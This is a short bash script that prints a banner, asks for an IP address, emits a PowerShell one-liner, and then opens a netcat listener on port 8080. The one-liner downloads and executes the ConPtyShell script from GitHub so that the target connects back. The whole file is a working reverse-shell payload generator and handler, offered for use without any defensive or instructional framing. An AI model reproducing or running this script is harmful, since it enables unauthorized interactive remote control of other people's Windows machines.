#! /bin/bash

echo "▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
█░██▄▄░█▄▄░█░██░███░▄▄▄█░▄▄█░▄▄▀█░▄▄█░▄▄▀█░▄▄▀█▄░▄█▀▄▄▀█░▄▄▀
█░██▀▄██▀▄██░▀▀░███░█▄▀█░▄▄█░██░█░▄▄█░▀▀▄█░▀▀░██░██░██░█░▀▀▄
█▄▄█▄▄▄█▄▄▄█▀▀▀▄███▄▄▄▄█▄▄▄█▄██▄█▄▄▄█▄█▄▄█▄██▄██▄███▄▄██▄█▄▄
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀"
sleep 1
# Set the color variable
green='\033[0;32m'
# Clear the color after that
clear='\033[0m'
echo -e "${green}ipadress?: "
read ipadress
echo "starting listener in 3..."
sleep 0.1
echo "2..."
sleep 0.1
echo "1..."
sleep 1
echo "${blue} IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ipadress 8080"
sleep 10
clear
stty raw -echo; (stty size; cat) | nc -lvnp 8080 
